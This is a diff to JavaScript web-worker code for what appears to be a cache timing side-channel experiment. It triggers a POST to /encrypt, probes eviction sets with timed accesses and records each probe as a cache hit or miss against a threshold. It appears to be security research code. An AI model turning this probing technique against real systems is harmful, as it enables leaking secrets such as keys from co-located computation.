@@ -1,4 +1,9 @@
-function encrypt() {
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function encrypt() {
+    // await sleep(100)
     console.log("calling encrypt");
     fetch("/encrypt", { method: "POST" }).then(() =>
         console.log("encrypt done!"),
@@ -294,9 +299,9 @@ self.onmessage = async (event) => {
     const total_num_results = config.time_slots * config.probe.length;
     const results = new Uint32Array(total_num_results);
     console.log("total number of results:", total_num_results)
-    // encrypt();
+    encrypt();
     for(let i = 0; i < total_num_results; i += config.probe.length) {
-        const startTime = wasmUtils.exports.get_time()
+        // const startTime = wasmUtils.exports.get_time()
         for(let j = 0; j < config.probe.length; j++) {
             // wasmUtils.exports.access(config.page_size)
             const t = timed_access(config.probe[j]);
@@ -305,13 +310,13 @@ self.onmessage = async (event) => {
             // const t = timed_hit(config.page_size);
             // const t = evGenerator.JSTimedMiss(config.page_size, evset[0])
             // results[i + j] = evGenerator.measureTimedMiss(timed_miss, config.page_size, candidates[0]);
-            results[i + j] = Number(t);
+            results[i + j] = Number(t) < config.threshold ? 1 : 0;
         }
         // if(i % 100 == 0) console.log(i)
         evict(conflictSet[0]);
-        do {
-            wait(config.wait_cycles);
-        } while (wasmUtils.exports.get_time() - startTime < BigInt(config.time_slot_size));
+        // do {
+        //     wait(config.wait_cycles);
+        // } while (wasmUtils.exports.get_time() - startTime < BigInt(config.time_slot_size));
     }
     let numEvicted = 0
     for(let i = 0; i < results.length; i++) {
